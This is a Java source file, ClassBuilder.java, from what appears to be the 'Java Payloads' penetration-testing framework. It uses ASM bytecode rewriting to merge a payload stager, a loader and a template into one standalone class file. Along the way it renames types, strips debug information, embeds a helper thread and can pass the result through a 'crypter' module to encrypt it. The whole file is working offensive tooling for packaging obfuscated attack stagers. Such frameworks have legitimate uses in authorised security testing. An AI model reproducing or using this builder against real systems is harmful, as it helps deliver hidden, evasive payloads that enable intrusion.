/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;

import javapayload.Module;
import javapayload.crypter.Crypter;
import javapayload.loader.DynLoader;
import javapayload.stager.Stager;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.MethodAdapter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class ClassBuilder extends Builder {

	protected static void buildClass(String classname, final String stager, Class loaderClass, final String embeddedArgs, String[] realArgs) throws Exception {
		final byte[] newBytecode = buildClassBytes(classname, stager, loaderClass, embeddedArgs, realArgs);
		if (classname.indexOf('^') != -1)
			classname = classname.substring(0, classname.indexOf('^'));
		final FileOutputStream fos = new FileOutputStream(classname + ".class");
		fos.write(newBytecode);
		fos.close();		
	}
	
	public static byte[] buildClassBytes(String classnameAndCrypter, final String stager, Class loaderClass, final String embeddedArgs, String[] realArgs) throws Exception {
		final String crypter, classname, finalClassname;
		int pos = classnameAndCrypter.indexOf('^'); 
		if (pos != -1) {
			finalClassname = classnameAndCrypter.substring(0, pos);
			crypter = classnameAndCrypter.substring(pos+1);
		} else {
			finalClassname = classnameAndCrypter;
			crypter = System.getProperty(CrypterBuilder.CRYPTER_PROPERTY);
		}
		classname = finalClassname + (crypter != null && crypter.length() > 0 ? "$" : "");
		final ClassWriter writerThreadCW = new ClassWriter(0);

		final ClassVisitor writerThreadVisitor = new ClassAdapter(writerThreadCW) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(version, access, "WaiterThread", signature, "java/lang/Thread", new String[0]);
			}

			public FieldVisitor visitField(int access, String name, String desc, String signature, Object value) {
				if (name.equals("instance"))
					return super.visitField(access, name,  "L"+classname+";", signature, value);
				else
					return null;
			}

			public void visitInnerClass(String name, String outerName, String innerName, int access) {
				// do not copy inner classes
			}

			public void visitOuterClass(String owner, String name, String desc) {
				// do not copy outer classes
			}
			
			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				if (name.equals("mainToEmbed")) {
					MethodVisitor mv = super.visitMethod(Opcodes.ACC_PUBLIC, "run", "()V", null, null);
					mv.visitCode();
					mv.visitVarInsn(Opcodes.ALOAD, 0);
					mv.visitFieldInsn(Opcodes.GETFIELD, "WaiterThread", "instance", "L"+classname+";");
					mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, classname, "waitReady", "()V");
					mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
					mv.visitInsn(Opcodes.DUP);
					mv.visitLdcInsn("+");
					mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "print", "(Ljava/lang/String;)V");
					mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "flush", "()V");
					mv.visitInsn(Opcodes.RETURN);
					mv.visitMaxs(3, 1);
					mv.visitEnd();
				} else if (name.equals("<init>")) {
					MethodVisitor mv = super.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "(L"+classname+";)V", null, null);
					mv.visitCode();
					mv.visitVarInsn(Opcodes.ALOAD, 0);
					mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Thread", "<init>", "()V");
					mv.visitVarInsn(Opcodes.ALOAD, 0);
					mv.visitVarInsn(Opcodes.ALOAD, 1);
					mv.visitFieldInsn(Opcodes.PUTFIELD, "WaiterThread", "instance", "L"+classname+";");
					mv.visitInsn(Opcodes.RETURN);
					mv.visitMaxs(2, 2);
					mv.visitEnd();
				}
				return null;
			}
		};
		visitClass(ClassBuilderTemplate.class, writerThreadVisitor, writerThreadCW);
		final byte[] waiterThread = writerThreadCW.toByteArray();
		
		final ClassWriter cw = new ClassWriter(0);

		class MyMethodVisitor extends MethodAdapter {
			private final String newClassName, baseClassName;

			public MyMethodVisitor(MethodVisitor mv, String newClassName) {
				this(mv, newClassName, null);
			}
			
			public MyMethodVisitor(MethodVisitor mv, String newClassName, String baseClassName) {
				super(mv);
				this.newClassName = newClassName;
				this.baseClassName = baseClassName;
			}

			private String cleanType(String type) {
				if (type.equals(baseClassName))
					type = "java/lang/ClassLoader";
				if (type.startsWith("javapayload/")) {
					type = newClassName;
				}
				return type;
			}

			public void visitFieldInsn(int opcode, String owner, String name, String desc) {
				super.visitFieldInsn(opcode, cleanType(owner), name, desc);
			}

			public void visitMethodInsn(int opcode, String owner, String name, String desc) {
				super.visitMethodInsn(opcode, cleanType(owner), name, desc);
			}

			public void visitTypeInsn(int opcode, String type) {
				super.visitTypeInsn(opcode, cleanType(type));
			}
			
			public void visitLdcInsn(Object cst) {
				if ("TO_BE_REPLACED".equals(cst))
					cst = embeddedArgs;
				try {
					if ("WAITER_THREAD".equals(cst))
						cst = new String(waiterThread, "ISO-8859-1");
				} catch (UnsupportedEncodingException ex) {
					ex.printStackTrace();
				}
				super.visitLdcInsn(cst);
			}
		}

		final ClassVisitor stagerVisitor = new ClassAdapter(cw) {

			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(version, access, classname, signature, "java/lang/ClassLoader", interfaces);
			}

			public void visitEnd() {
				// not the end!
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				// rewrite constructors
				if (name.equals("<init>")) {
					return new MyMethodVisitor(super.visitMethod(access, name, desc, signature, exceptions), classname, "javapayload/stager/Stager");
				}
				return new MyMethodVisitor(super.visitMethod(access, name, desc, signature, exceptions), classname);
			}
		};
		visitClass(DynLoader.loadStager(stager, realArgs, 1), stagerVisitor, cw);
		final ClassVisitor stagerBaseVisitor = new ClassAdapter(cw) {

			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				// not the beginning!
			}

			public void visitEnd() {
				// not the end!
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				// strip constructors
				if (name.equals("<init>")) {
					return null;
				}				
				// strip abstract bootstrap method
				if ((name.equals("bootstrap") || name.equals("waitReady")) && (access & Opcodes.ACC_ABSTRACT) != 0) {
					return null;
				}
				return new MyMethodVisitor(super.visitMethod(access, name, desc, signature, exceptions), classname);
			}
		};
		visitClass(Stager.class, stagerBaseVisitor, cw);
		final ClassVisitor loaderVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				// not the beginning!
			}

			public FieldVisitor visitField(int access, String name, String desc, String signature, Object value) {
				// do not copy fields
				return null;
			}

			public void visitInnerClass(String name, String outerName, String innerName, int access) {
				// do not copy inner classes
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				if (name.equals("mainToEmbed")) {
					return new MyMethodVisitor(super.visitMethod(access, "main", desc, signature, exceptions), classname);
				} else {
					return null;
				}
			}

			public void visitOuterClass(String owner, String name, String desc) {
				// do not copy outer classes
			}
		};
		visitClass(loaderClass, loaderVisitor, cw);
		byte[] result = cw.toByteArray();
		if (crypter != null && crypter.length() > 0) {
			Crypter c = (Crypter) Module.load(Crypter.class, crypter);
			result = c.crypt(finalClassname, result);
		}
		return result;
	}

	public static void main(String[] args) throws Exception {
		if (args.length != 1 && args.length != 2) {
			System.out.println("Usage: java javapayload.builder.ClassBuilder "+new ClassBuilder().getParameterSyntax());
			return;
		}
		new ClassBuilder().build(args);
	}
	
	public ClassBuilder() {
		super("Build a standalone Class file", "");
	}
	
	public String getParameterSyntax() {
		return "<stager> [<classname>[^<crypter>]]";
	}
	
	public void build(String[] args) throws Exception {
		final String stager = args[0];
		String classname = stager + "Class";
		if (args.length == 2) {
			classname = args[1];
		}

		buildClass(classname, stager, ClassBuilderTemplate.class, null, null);
	}

	public static void visitClass(Class clazz, ClassVisitor stagerVisitor, ClassWriter cw) throws Exception {
		final InputStream is = clazz.getResourceAsStream("/" + clazz.getName().replace('.', '/') + ".class");
		final ClassReader cr = new ClassReader(is);
		cr.accept(stagerVisitor, ClassReader.SKIP_DEBUG);
		is.close();
	}

	public static void writeClassWithoutDebugInfo(InputStream in, OutputStream out) throws IOException {
		final ClassReader cr = new ClassReader(in);
		final ClassWriter cw = new ClassWriter(0);
		cr.accept(cw, ClassReader.SKIP_DEBUG);
		in.close();
		out.write(cw.toByteArray());
	}
	
	public static class ClassBuilderTemplate extends Stager {
		
		private ClassBuilderTemplate instance;
		
		public static void mainToEmbed(String[] args) throws Exception {
			ClassBuilderTemplate cb = new ClassBuilderTemplate();
			try {
				Field f = Class.forName("java.lang.ClassLoader").getDeclaredField("parent");
				f.setAccessible(true);
				f.set(cb, cb.getClass().getClassLoader());
			} catch (Throwable t) {}
			boolean needWait = false;
			if (args[0].startsWith("+")) {
				args[0] = args[0].substring(1);
				needWait = true;
				byte[] clazz = "WAITER_THREAD".getBytes("ISO-8859-1");
				Thread waiterThread = (Thread)cb.defineClass(clazz, 0, clazz.length).getConstructors()[0].newInstance(new Object[] {cb});
				waiterThread.start();
			}
			cb.bootstrap(args, needWait);
		}
		
		public void run() {
			instance.waitReady();
			System.out.print("+");
			System.out.flush();
		}

		public void bootstrap(String[] parameters, boolean needWait) throws Exception {
			throw new Exception("Never used!");
		}
		
		public void waitReady() {
			throw new RuntimeException("Never used!");
		}		
	}
}

